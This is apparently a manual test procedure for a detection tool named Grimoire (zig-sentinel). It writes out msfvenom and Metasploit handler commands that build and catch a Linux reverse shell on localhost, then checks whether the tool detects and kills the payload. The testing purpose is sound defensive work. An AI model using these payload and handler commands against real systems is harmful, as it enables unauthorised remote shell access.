# Manual Test 01: Basic Reverse Shell vs Grimoire

**Quick manual test procedure - no complex automation**

---

## Step 1: Generate Payload

```bash
cd /tmp
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=127.0.0.1 \
    LPORT=4444 \
    -f elf \
    -o reverse_shell.elf

chmod +x reverse_shell.elf
```

---

## Step 2: Start Metasploit Handler (Terminal 1)

```bash
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD linux/x64/shell_reverse_tcp;
set LHOST 127.0.0.1;
set LPORT 4444;
exploit
"
```

**Wait for**: `[*] Started reverse TCP handler on 127.0.0.1:4444`

---

## Step 3: Start Guardian (Terminal 2)

```bash
cd /home/founder/github_public/guardian-shield

sudo ./zig-out/bin/zig-sentinel \
    --enable-grimoire \
    --grimoire-debug \
    --grimoire-enforce \
    --duration=60 \
    | tee /tmp/grimoire-trial.log
```

**Wait for**: `Unified Oracle activated`

---

## Step 4: Execute Payload (Terminal 3)

```bash
/tmp/reverse_shell.elf
```

---

## Step 5: Observe Results

### In Terminal 1 (Metasploit Handler):
- **Success (for attacker)**: `[*] Command shell session X opened`
- **Failure (for attacker)**: Nothing / connection closes immediately

### In Terminal 2 (Guardian):
- **Look for**: `🚨 GRIMOIRE MATCH: reverse_shell_classic`
- **Look for**: `⚔️  TERMINATED PID XXXXX`

### Alternative: Check logs after
```bash
strings /tmp/grimoire-trial.log | grep "GRIMOIRE MATCH"
strings /tmp/grimoire-trial.log | grep "TERMINATED"
```

---

## Expected Outcome

**If Grimoire Works**:
1. Payload executes and makes syscalls
2. Grimoire detects pattern: `reverse_shell_classic`
3. Grimoire terminates payload before shell spawns
4. Metasploit handler sees connection attempt but no shell

**If Grimoire Fails**:
1. Payload executes successfully
2. Metasploit handler gets full shell session
3. No GRIMOIRE MATCH in logs
4. Need to analyze syscall patterns

---

## Cleanup

```bash
# Kill everything
sudo pkill zig-sentinel
pkill -9 msfconsole
rm /tmp/reverse_shell.elf
```
